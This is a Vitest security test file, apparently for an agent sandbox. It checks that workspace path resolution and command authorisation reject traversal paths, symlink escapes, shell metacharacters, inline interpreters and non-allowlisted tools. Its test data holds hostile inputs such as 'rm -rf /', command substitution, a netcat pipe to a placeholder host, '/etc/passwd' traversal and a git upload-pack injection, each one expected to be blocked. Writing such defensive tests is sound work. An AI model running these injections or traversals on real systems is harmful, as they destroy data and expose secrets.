import { afterAll, beforeAll, describe, expect } from "vitest";
import { mkdtempSync, mkdirSync, rmSync, symlinkSync, writeFileSync, realpathSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { redclaw } from "./redclaw";
import { resolveWorkspacePath, PathViolation } from "@/security/paths";
import { authorizeCommand, CommandViolation } from "@/security/commands";

let base: string;
let ws: string;
let outside: string;

beforeAll(() => {
  base = mkdtempSync(join(tmpdir(), "redclaw-fs-"));
  ws = join(base, "workspace");
  outside = join(base, "outside");
  mkdirSync(join(ws, "docs"), { recursive: true });
  mkdirSync(outside);
  writeFileSync(join(outside, "secret.txt"), "x");
  writeFileSync(join(ws, "docs", "ok.md"), "ok");
  symlinkSync(outside, join(ws, "escape-dir"));
  symlinkSync(join(outside, "secret.txt"), join(ws, "docs", "escape-file.txt"));
  symlinkSync(join(ws, "docs"), join(ws, "inner-link"));
});
afterAll(() => rmSync(base, { recursive: true, force: true }));

describe("filesystem", () => {
  redclaw("path_traversal", "dot-dot, absolute, drive, UNC, backslash and NUL paths are rejected", () => {
    for (const p of ["../outside/secret.txt", "docs/../../outside", "/etc/passwd", "C:\\Windows\\system.ini", "\\\\host\\share", "docs\\..\\..\\outside", "docs/ok.md\0.png", ""]) {
      expect(() => resolveWorkspacePath(ws, p), JSON.stringify(p)).toThrow(PathViolation);
    }
  });

  redclaw("path_traversal", "normal relative paths resolve inside the workspace", () => {
    expect(resolveWorkspacePath(ws, "docs/ok.md")).toBe(join(realpathSync(ws), "docs", "ok.md"));
    expect(resolveWorkspacePath(ws, "docs/new/file.md")).toBe(join(realpathSync(ws), "docs", "new", "file.md"));
  });

  redclaw("symlink_escape", "symlinked directories and files pointing outside are rejected", () => {
    expect(() => resolveWorkspacePath(ws, "escape-dir/secret.txt")).toThrow(/symlink/);
    expect(() => resolveWorkspacePath(ws, "docs/escape-file.txt")).toThrow(/symlink/);
    expect(() => resolveWorkspacePath(ws, "escape-dir/new-file.txt")).toThrow(/symlink/);
  });

  redclaw("symlink_escape", "symlinks that stay inside the workspace are allowed", () => {
    expect(resolveWorkspacePath(ws, "inner-link/ok.md")).toBe(join(realpathSync(ws), "docs", "ok.md"));
  });
});

describe("commands", () => {
  const allow = ["git", "ls", "python3", "node"];

  redclaw("command_injection", "shell metacharacters and chained commands are rejected", () => {
    for (const argv of [["ls", "; rm -rf /"], ["ls", "$(whoami)"], ["ls", "`id`"], ["ls", "a && b"], ["ls", "a | nc evil 1"], ["ls", "x\nrm -rf /"], ["ls", "> /etc/passwd"]]) {
      expect(() => authorizeCommand("OPERATOR", argv, allow), argv.join(" ")).toThrow(CommandViolation);
    }
  });

  redclaw("command_injection", "shells, paths to binaries and inline interpreters are rejected", () => {
    expect(() => authorizeCommand("OPERATOR", ["bash", "-c", "id"], [...allow, "bash"])).toThrow(/shells/);
    expect(() => authorizeCommand("OPERATOR", ["/bin/ls"], allow)).toThrow(/bare/);
    expect(() => authorizeCommand("OPERATOR", ["python3", "-c", "print(1)"], allow)).toThrow(/inline/);
    expect(() => authorizeCommand("OPERATOR", ["node", "--eval=1"], allow)).toThrow(/inline/);
    expect(() => authorizeCommand("OPERATOR", ["git", "--upload-pack=touch /tmp/pwn"], allow)).toThrow(CommandViolation);
    expect(() => authorizeCommand("OPERATOR", ["curl", "https://x"], allow)).toThrow(/not allowlisted/);
  });

  redclaw("tool_escalation", "SAFE profile cannot run any command", () => {
    expect(() => authorizeCommand("SAFE", ["ls"], allow)).toThrow(/SAFE/);
  });

  redclaw("command_injection", "allowlisted argv passes through unchanged for execFile (no shell)", () => {
    expect(authorizeCommand("OPERATOR", ["git", "status", "--short"], allow)).toEqual({ file: "git", args: ["status", "--short"] });
  });
});
